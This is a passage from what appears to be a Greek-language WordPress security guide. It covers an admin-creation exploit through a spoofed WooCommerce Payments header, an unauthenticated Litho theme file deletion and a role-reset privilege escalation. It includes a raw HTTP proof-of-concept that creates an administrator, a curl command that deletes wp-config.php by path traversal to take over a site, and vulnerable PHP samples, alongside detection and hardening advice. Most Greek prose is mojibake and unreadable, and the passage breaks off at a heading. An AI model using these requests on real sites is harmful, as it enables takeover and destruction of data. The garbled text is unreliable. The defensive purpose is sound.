Î•Î¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÎµÎºÏ„ÎµÎ¸Î¿ÏÎ½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Î±Ï€ÏŒ Ï„Î¿ wordpress ÎºÎ±Ï„Î±Ï‡Ï‰ÏÏÎ½Ï„Î±Ï‚ Î­Î½Î± REST API Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Î¤Î¿ `permission_callback` ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· callback Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Î±Î½ Î­Î½Î±Ï‚ Î´Î¿Î¸ÎµÎ¯Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î­Ï‡ÎµÎ¹ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ· Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ Ï„Î¿Ï… API.

**Î•Î¬Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î· ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `__return_true`, Î¸Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹ Î±Ï€Î»Î¬ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Ï‡ÏÎ®ÏƒÏ„Î·.**

- **Î†Î¼ÎµÏƒÎ· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ PHP**

Î¦Ï…ÏƒÎ¹ÎºÎ¬, Ï„Î¿ Wordpress Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ PHP ÎºÎ±Î¹ Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± Î¼Î­ÏƒÎ± ÏƒÎµ plugins ÎµÎ¯Î½Î±Î¹ Î¬Î¼ÎµÏƒÎ± Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î± Î±Ï€ÏŒ Ï„Î¿ web. ÎˆÏ„ÏƒÎ¹, Î±Î½ Î­Î½Î± plugin ÎµÎºÎ¸Î­Ï„ÎµÎ¹ ÎµÏ…Î¬Î»Ï‰Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î± Ï€Î¿Ï… ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€Î»ÏÏ‚ Î¼Îµ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿, Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î±Ï€ÏŒ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Ï‡ÏÎ®ÏƒÏ„Î·.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ÎšÎ¬Ï€Î¿Î¹Î± plugins Ï…Î»Î¿Ï€Î¿Î¹Î¿ÏÎ½ ÏƒÏ…Î½Ï„Î¿Î¼ÎµÏÏƒÎµÎ¹Ï‚ â€œtrusted headerâ€ Î³Î¹Î± ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ­Ï‚ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„ÏÏƒÎµÎ¹Ï‚ Î® reverse proxies ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ Î±Ï…Ï„ÏŒ Ï„Î¿ header Î³Î¹Î± Î½Î± Î¿ÏÎ¯ÏƒÎ¿Ï…Î½ Ï„Î¿ Ï„ÏÎ­Ï‡Î¿Î½ user context Î³Î¹Î± REST requests. Î‘Î½ Ï„Î¿ header Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î¹ÎºÎ¬ Î´ÎµÎ¼Î­Î½Î¿ Î¼Îµ Ï„Î¿ request Î±Ï€ÏŒ Î­Î½Î± upstream component, Î­Î½Î±Ï‚ attacker Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„Î¿ spoofÎ¬ÏÎµÎ¹ ÎºÎ±Î¹ Î½Î± Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î¬ÏƒÎµÎ¹ privileged REST routes Ï‰Ï‚ administrator.

- Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·: Î¼Î· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· privilege escalation ÏƒÎµ admin Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÏÎ½Ï„Î±Ï‚ Î½Î­Î¿ administrator Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (ÎµÏ€Î¹Î²Î¬Î»Î»ÎµÎ¹ Ï„Î¿ user ID 1, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î¿ Ï€ÏÏÏ„Î¿Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ administrator).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Î“Î¹Î±Ï„Î¯ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯

- Î¤Î¿ plugin Î±Î½Ï„Î¹ÏƒÏ„Î¿Î¹Ï‡Î¯Î¶ÎµÎ¹ Î¼Î¹Î± ÎºÎµÏ†Î±Î»Î¯Î´Î± Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ client ÏƒÏ„Î·Î½ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î±Ï…Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ ÎºÎ±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ Ï„Î¿Ï…Ï‚ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½.
- ÎŸ Ï€Ï…ÏÎ®Î½Î±Ï‚ Ï„Î¿Ï… WordPress Î±Î½Î±Î¼Î­Î½ÎµÎ¹ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± `create_users` Î³Î¹Î± Î±Ï…Ï„Î® Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î®Â· Ï„Î¿ hack Ï„Î¿Ï… plugin Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ ÏÏ…Î¸Î¼Î¯Î¶Î¿Î½Ï„Î±Ï‚ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Ï„Î¿ context Ï„Î¿Ï… Ï„ÏÎ­Ï‡Î¿Î½Ï„Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î· Î±Ï€ÏŒ Ï„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î±.

Î ÏÎ¿ÏƒÎ´Î¿ÎºÏÎ¼ÎµÎ½Î¿Î¹ Î´ÎµÎ¯ÎºÏ„ÎµÏ‚ ÎµÏ€Î¹Ï„Ï…Ï‡Î¯Î±Ï‚

- HTTP 201 Î¼Îµ JSON ÏƒÏÎ¼Î± Ï€Î¿Ï… Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†ÎµÎ¹ Ï„Î¿Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¼Î­Î½Î¿ Ï‡ÏÎ®ÏƒÏ„Î·.
- ÎˆÎ½Î±Ï‚ Î½Î­Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î¿ÏÎ±Ï„ÏŒÏ‚ ÏƒÏ„Î¿ `wp-admin/users.php`.

Î›Î¯ÏƒÏ„Î± ÎµÎ»Î­Î³Ï‡Î¿Ï… Î±Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·Ï‚

- Î¨Î¬Î¾Ï„Îµ (grep) Î³Î¹Î± `getallheaders()`, `$_SERVER['HTTP_...']`, Î® vendor SDKs Ï€Î¿Ï… Î´Î¹Î±Î²Î¬Î¶Î¿Ï…Î½ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½ÎµÏ‚ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ Î³Î¹Î± Î½Î± Î¿ÏÎ¯ÏƒÎ¿Ï…Î½ Ï„Î¿ context Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· (Ï€.Ï‡. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Î•Ï€Î±Î½ÎµÎ¾ÎµÏ„Î¬ÏƒÏ„Îµ Ï„Î¹Ï‚ ÎµÎ³Î³ÏÎ±Ï†Î­Ï‚ REST Î³Î¹Î± privileged callbacks Ï€Î¿Ï… Î´ÎµÎ½ Î­Ï‡Î¿Ï…Î½ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î¿Ï…Ï‚ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ `permission_callback` ÎºÎ±Î¹ Î±Î½Ï„Î¯Î¸ÎµÏ„Î± Î²Î±ÏƒÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÎµ request headers.
- Î‘Î½Î±Î¶Î·Ï„Î®ÏƒÏ„Îµ Ï‡ÏÎ®ÏƒÎµÎ¹Ï‚ Ï„Ï‰Î½ core user-management functions (`wp_insert_user`, `wp_create_user`) Î¼Î­ÏƒÎ± ÏƒÎµ REST handlers Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎ¿Î½Ï„Î±Î¹ Î¼ÏŒÎ½Î¿ Î±Ï€ÏŒ Ï„Î¹Î¼Î­Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´Ï‰Î½.

Î£ÎºÎ»Î·ÏÏ…Î½ÏƒÎ·

- ÎœÎ·Î½ Î²Î±ÏƒÎ¯Î¶ÎµÏ„Îµ Ï€Î¿Ï„Î­ Ï„Î·Î½ Ï„Î±Ï…Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î® Ï„Î·Î½ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ· ÏƒÎµ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ client.
- Î•Î¬Î½ Î­Î½Î±Ï‚ reverse proxy Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Ï„Î±Ï…Ï„ÏŒÏ„Î·Ï„Î±, Ï„ÎµÏÎ¼Î±Ï„Î¯ÏƒÏ„Îµ Ï„Î·Î½ ÎµÎ¼Ï€Î¹ÏƒÏ„Î¿ÏƒÏÎ½Î· ÏƒÏ„Î¿ proxy ÎºÎ±Î¹ Î±Ï†Î±Î¹ÏÎ­ÏƒÏ„Îµ ÎµÎ¹ÏƒÎµÏÏ‡ÏŒÎ¼ÎµÎ½Î± Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î± (Ï€.Ï‡. `unset X-Wcpay-Platform-Checkout-User` ÏƒÏ„Î¿ edge), ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï€ÎµÏÎ¬ÏƒÏ„Îµ Î­Î½Î± Ï…Ï€Î¿Î³ÎµÎ³ÏÎ±Î¼Î¼Î­Î½Î¿ token ÎºÎ±Î¹ ÎµÏ€Î±Î»Î·Î¸ÎµÏÏƒÏ„Îµ Ï„Î¿ server-side.
- Î“Î¹Î± REST routes Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ privileged actions, Î±Ï€Î±Î¹Ï„Î®ÏƒÏ„Îµ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ `current_user_can()` ÎºÎ±Î¹ Î­Î½Î± Î±Ï…ÏƒÏ„Î·ÏÏŒ `permission_callback` (Î¼Î· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Îµ `__return_true`).
- Î ÏÎ¿Ï„Î¹Î¼Î®ÏƒÏ„Îµ first-party auth (cookies, application passwords, OAuth) Î±Î½Ï„Î¯ Î³Î¹Î± header â€œimpersonationâ€.

Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚: Î´ÎµÎ¯Ï„Îµ Ï„Î¿Ï…Ï‚ ÏƒÏ…Î½Î´Î­ÏƒÎ¼Î¿Ï…Ï‚ ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚ Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÏƒÎµÎ»Î¯Î´Î±Ï‚ Î³Î¹Î± Î­Î½Î± Î´Î·Î¼ÏŒÏƒÎ¹Î¿ Ï€ÎµÏÎ¹ÏƒÏ„Î±Ï„Î¹ÎºÏŒ ÎºÎ±Î¹ ÎµÏ…ÏÏÏ„ÎµÏÎ· Î±Î½Î¬Î»Ï…ÏƒÎ·.

### ÎœÎ·-ÎµÏ€Î±Î»Î·Î¸ÎµÏ…Î¼Î­Î½Î· Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î· Î´Î¹Î±Î³ÏÎ±Ï†Î® Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Î¼Î­ÏƒÏ‰ wp_ajax_nopriv (Litho Theme <= 3.0)

Î¤Î± themes ÎºÎ±Î¹ plugins Ï„Î¿Ï… WordPress ÏƒÏ…Ï‡Î½Î¬ ÎµÎºÎ¸Î­Ï„Î¿Ï…Î½ AJAX handlers Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ hooks `wp_ajax_` ÎºÎ±Î¹ `wp_ajax_nopriv_`. ÎŒÏ„Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î· Ï€Î±ÏÎ±Î»Î»Î±Î³Î® **_nopriv_** **Î· callback Î³Î¯Î½ÎµÏ„Î±Î¹ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î· Î±Ï€ÏŒ Î¼Î·-ÎµÏ€Î±Î»Î·Î¸ÎµÏ…Î¼Î­Î½Î¿Ï…Ï‚ ÎµÏ€Î¹ÏƒÎºÎ­Ï€Ï„ÎµÏ‚**, Î¿Ï€ÏŒÏ„Îµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î· ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± Ï€ÏÎ­Ï€ÎµÎ¹ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î½Î± Ï…Î»Î¿Ï€Î¿Î¹ÎµÎ¯:

1. ÎˆÎ½Î±Î½ **Î­Î»ÎµÎ³Ï‡Î¿ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½** (Ï€.Ï‡. `current_user_can()` Î® Ï„Î¿Ï…Î»Î¬Ï‡Î¹ÏƒÏ„Î¿Î½ `is_user_logged_in()`), ÎºÎ±Î¹
2. ÎˆÎ½Î± **CSRF nonce** ÎµÏ€Î¹ÎºÏ…ÏÏ‰Î¼Î­Î½Î¿ Î¼Îµ `check_ajax_referer()` / `wp_verify_nonce()`, ÎºÎ±Î¹
3. **Î‘Ï…ÏƒÏ„Î·ÏÎ® ÎµÎ¾Ï…Î³Î¯Î±Î½ÏƒÎ· / ÎµÏ€Î±Î»Î®Î¸ÎµÏ…ÏƒÎ· ÎµÎ¹ÏƒÏŒÎ´Î¿Ï…**.

Î¤Î¿ multipurpose theme Litho (< 3.1) Î¾Î­Ï‡Î±ÏƒÎµ Î±Ï…Ï„Î¿ÏÏ‚ Ï„Î¿Ï…Ï‚ 3 ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ ÏƒÏ„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± *Remove Font Family* ÎºÎ±Î¹ ÎºÎ±Ï„Î­Î»Î·Î¾Îµ Î½Î± ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î¿Î½ Î±ÎºÏŒÎ»Î¿Ï…Î¸Î¿ ÎºÏÎ´Î¹ÎºÎ± (Î±Ï€Î»Î¿Ï…ÏƒÏ„ÎµÏ…Î¼Î­Î½Î¿Ï‚):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Î ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î± Ï€Î¿Ï… ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±Ï€ÏŒÏƒÏ€Î±ÏƒÎ¼Î±:

* **ÎœÎ· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·** â€“ Ï„Î¿ hook `wp_ajax_nopriv_` Î­Ï‡ÎµÎ¹ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Î¸ÎµÎ¯.
* **Î”ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î»ÎµÎ³Ï‡Î¿Ï‚ nonce / capability** â€“ Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ ÎµÏ€Î¹ÏƒÎºÎ­Ï€Ï„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î¬ÏƒÎµÎ¹ Ï„Î¿ endpoint.
* **Î”ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎºÎ±Î¸Î±ÏÎ¹ÏƒÎ¼ÏŒÏ‚ Î¼Î¿Î½Î¿Ï€Î±Ï„Î¹Î¿Ï** â€“ Î· ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬ Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· `fontfamily` ÏƒÏ…Î½ÎµÎ½ÏÎ½ÎµÏ„Î±Î¹ ÏƒÎµ Î­Î½Î± filesystem path Ï‡Ï‰ÏÎ¯Ï‚ Ï†Î¹Î»Ï„ÏÎ¬ÏÎ¹ÏƒÎ¼Î±, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î¿ ÎºÎ»Î±ÏƒÎ¹ÎºÏŒ traversal `../../`.

#### Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î±ÏÏ‡ÎµÎ¯Î¿ Î® ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ **ÎºÎ¬Ï„Ï‰ Î±Ï€ÏŒ Ï„Î¿Î½ Î²Î±ÏƒÎ¹ÎºÏŒ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ uploads** (ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ `<wp-root>/wp-content/uploads/`) ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ Î­Î½Î± Î¼ÏŒÎ½Î¿ HTTP POST request:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Detection checklist

* Any `add_action( 'wp_ajax_nopriv_...')` callback that calls filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenation of unsanitised user input into paths (look for `$_POST`, `$_GET`, `$_REQUEST`).
* Absence of `check_ajax_referer()` and `current_user_can()`/`is_user_logged_in()`.

#### Hardening
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Always** Î¸ÎµÏ‰ÏÎµÎ¯Ï„Îµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚/Î´Î¹Î±Î³ÏÎ±Ï†Î®Ï‚ ÏƒÏ„Î¿ Î´Î¯ÏƒÎºÎ¿ Ï‰Ï‚ privileged ÎºÎ±Î¹ ÎµÎ»Î­Î³Î¾Ï„Îµ Ï€ÏÎ¿ÏƒÎµÎºÏ„Î¹ÎºÎ¬:
> â€¢ Authentication  â€¢ Authorisation  â€¢ Nonce  â€¢ Input sanitisation  â€¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation Î¼Î­ÏƒÏ‰ Î±Ï€Î¿ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚ Ï€Î±ÏÏ‰Ï‡Î·Î¼Î­Î½Ï‰Î½ ÏÏŒÎ»Ï‰Î½ ÎºÎ±Î¹ missing authorization (ASE "View Admin as Role")

Î Î¿Î»Î»Î¬ plugins Ï…Î»Î¿Ï€Î¿Î¹Î¿ÏÎ½ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± "view as role" Î® Ï€ÏÎ¿ÏƒÏ‰ÏÎ¹Î½Î®Ï‚ ÎµÎ½Î±Î»Î»Î±Î³Î®Ï‚ ÏÏŒÎ»Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Ï‚ Ï„Î¿Ï…Ï‚ Î±ÏÏ‡Î¹ÎºÎ¿ÏÏ‚ ÏÏŒÎ»Î¿Ï…Ï‚ ÏƒÏ„Î¿ user meta ÏÏƒÏ„Îµ Î½Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÏ€Î±Î½Î±Ï†ÎµÏÎ¸Î¿ÏÎ½ Î±ÏÎ³ÏŒÏ„ÎµÏÎ±. Î‘Î½ Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ Î²Î±ÏƒÎ¯Î¶ÎµÏ„Î±Î¹ Î¼ÏŒÎ½Î¿ ÏƒÎµ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚ (Ï€.Ï‡. `$_REQUEST['reset-for']`) ÎºÎ±Î¹ ÏƒÎµ Î¼Î¹Î± Î»Î¯ÏƒÏ„Î± Ï€Î¿Ï… Î´Î¹Î±Ï„Î·ÏÎµÎ¯ Ï„Î¿ plugin Ï‡Ï‰ÏÎ¯Ï‚ Î­Î»ÎµÎ³Ï‡Î¿ capabilities ÎºÎ±Î¹ Ï‡Ï‰ÏÎ¯Ï‚ Î­Î³ÎºÏ…ÏÎ¿ nonce, Î±Ï…Ï„ÏŒ Î³Î¯Î½ÎµÏ„Î±Î¹ vertical privilege escalation.

ÎˆÎ½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î²ÏÎ­Î¸Î·ÎºÎµ ÏƒÏ„Î¿ Admin and Site Enhancements (ASE) plugin (â‰¤ 7.6.2.1). Î¤Î¿ reset branch ÎµÏ€Î±Î½Î­Ï†ÎµÏÎµ ÏÏŒÎ»Î¿Ï…Ï‚ Î²Î¬ÏƒÎµÎ¹ `reset-for=<username>` ÎµÎ¬Î½ Ï„Î¿ username ÎµÎ¼Ï†Î±Î½Î¹Î¶ÏŒÏ„Î±Î½ ÏƒÎµ Î­Î½Î±Î½ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏŒ Ï€Î¯Î½Î±ÎºÎ± `$options['viewing_admin_as_role_are']`, Î±Î»Î»Î¬ Î´ÎµÎ½ ÎµÎºÏ„Î­Î»ÎµÏƒÎµ Î¿ÏÏ„Îµ Î­Î»ÎµÎ³Ï‡Î¿ `current_user_can()` Î¿ÏÏ„Îµ ÎµÏ€Î±Î»Î®Î¸ÎµÏ…ÏƒÎ· nonce Ï€ÏÎ¹Î½ Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÎ¹ Ï„Î¿Ï…Ï‚ Ï„ÏÎ­Ï‡Î¿Î½Ï„ÎµÏ‚ ÏÏŒÎ»Î¿Ï…Ï‚ ÎºÎ±Î¹ ÎµÏ€Î±Î½Î±Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ Ï„Î¿Ï…Ï‚ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î¿Ï…Ï‚ ÏÏŒÎ»Î¿Ï…Ï‚ Î±Ï€ÏŒ Ï„Î¿ user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Î“Î¹Î±Ï„Î¯ ÎµÎ¯Î½Î±Î¹ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎ¹Î¼Î¿

